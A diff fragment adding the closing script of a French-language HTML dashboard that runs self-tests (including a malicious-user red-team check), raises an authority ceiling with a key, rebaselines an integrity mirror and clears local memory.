+    ['utilisateur malveillant', K.runMaliciousUserRedTeam]
+  ];
+  box.innerHTML = '';
+  let bad = 0;
+  tests.forEach(([name, fn]) => {
+    const d = document.createElement('div');
+    try {
+      const r = fn();
+      const pass = r.pass !== undefined ? r.pass : r.passed;
+      if (!pass) bad++;
+      d.className = 'ent ' + (pass ? 'g' : 'r');
+      d.textContent = (pass ? '✅ ' : '❌ ') + name + (r.attacks ? ' · ' + r.attacks + ' attaques' : '') + (r.blocked ? ' · ' + r.blocked + ' bloquées' : '');
+    } catch (e) { bad++; d.className = 'ent r'; d.textContent = '💥 ' + name + ' · ' + e.message; }
+    box.appendChild(d);
+  });
+  $('#say').innerHTML = bad === 0
+    ? '<span class="ok">Auto-test : tout passe</span> · ' + (Date.now() - t0) + ' ms · l\'audit revient dans 8 s'
+    : '<span class="bad">Auto-test : ' + bad + ' échec(s)</span>';
+  setTimeout(refresh, 8000);
+};
+
+/* ---------------- Recharge légitime du plafond ---------------- */
+$('#bRech').onclick = () => {
+  if (!J) return;
+  const r = J.raiseAuthorityCeiling(100, HK);
+  if (!r.allowed) { $('#say').innerHTML = '<span class="bad">Recharge refusée : ' + esc(r.reason) + '</span>'; return; }
+  refresh();
+  const broke = !J.mirror.verify().allowed;
+  J.rebaselineMirror(HK);
+  refresh();
+  $('#say').innerHTML = '<span class="ok">Plafond relevé de 100.</span> ' +
+    (broke ? 'Le miroir avait rompu (comportement [C1] attendu), re-baseliné.' : '');
+};
+
+$('#bWipe').onclick = () => {
+  if (confirm('Effacer la mémoire locale des 3 jours ?')) { localStorage.removeItem(MEM_KEY); drawMem(); }
+};
+
+/* ---------------- Départ ---------------- */
+setMode('idle');
+refresh();
+setTimeout(()=>{unlockMemory().catch(e=>showFatal('mémoire',e.message));},400);
+</script>
+</body>
+</html>
